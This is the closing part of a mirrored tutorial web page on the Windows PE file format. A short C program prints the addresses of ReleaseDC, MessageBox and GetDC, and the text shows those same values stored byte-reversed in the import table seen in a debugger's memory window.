<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>ReleaseDC(0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Running the above program transports
us to the debugger. In the memory window, the memory location of 00404090 is
given. The bytes shown are as follows.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Memory<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>00404090 7A 3A E1 77<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>00404094<span style="mso-spacerun:
yes">  </span>D5 75 E3 77 <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>00404098 6C 3A E1 77 <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Now run the program f.c<span
style="mso-spacerun: yes">  </span>which has the following.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>f.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;ReleaseDC=%x\n&quot;,ReleaseDC);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MessageBox=%x\n&quot;,MessageBox);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;GetDC=%x\n&quot;,GetDC);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>ReleaseDC=77e13a7a<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>MessageBox=77e375d5<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>GetDC=77e13a6c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyText2>This program discloses the address of the ReleaseDC
function as 77e13a7a. At memory location 404090, the same value is stored but with
the bytes in reverse order. The import table also shows the ReleaseDC function
as its first member and the Disassembly shows the same value too. In the same
vein the address of the MessageBoxA function is at 77e375d5 and it should be at
location 404094. Ditto for GetDC.</p>

<p class=MsoBodyText2><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<p class=MsoBodyText2><a href="../../security.html"><b>Back to the main page</b></a></p>

</div>

</body>


<!-- Mirrored from www.vijaymukhi.com/security/windows/pefile.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:40:15 GMT -->
</html>
